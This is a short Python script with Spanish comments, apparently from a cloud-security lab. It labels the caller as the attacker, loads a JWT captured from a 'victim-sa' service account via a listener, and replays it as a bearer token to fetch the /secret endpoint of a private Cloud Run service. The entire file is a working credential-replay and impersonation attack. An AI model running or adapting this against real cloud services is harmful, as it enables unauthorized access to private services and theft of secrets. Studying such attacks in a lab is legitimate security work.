import subprocess
import requests

# 1. Mostrar identidad actual (atacante)
print("[v] Current identity (attacker):")
subprocess.run(["gcloud", "auth", "list"], check=True)

# 2. Cargar el token del victim-sa (recibido desde el listener)
with open("modules/common/captured_token.txt", "r") as f:
    jwt_token = f.read().strip()

# 3. Leer la URL del servicio privado
with open("cloud_run_real_url.txt", "r") as f:
    target_url = f.read().strip()

# 4. Hacer petición autenticada como victim-sa
headers = {
    "Authorization": f"Bearer {jwt_token}"
}

print(f"[v] Sending impersonated request to {target_url} ...")
response = requests.get(f"{target_url}/secret", headers=headers)

# 5. Mostrar resultado
print(f"[v] Response code: {response.status_code}")
print(f"[v] Response body:\n{response.text}")
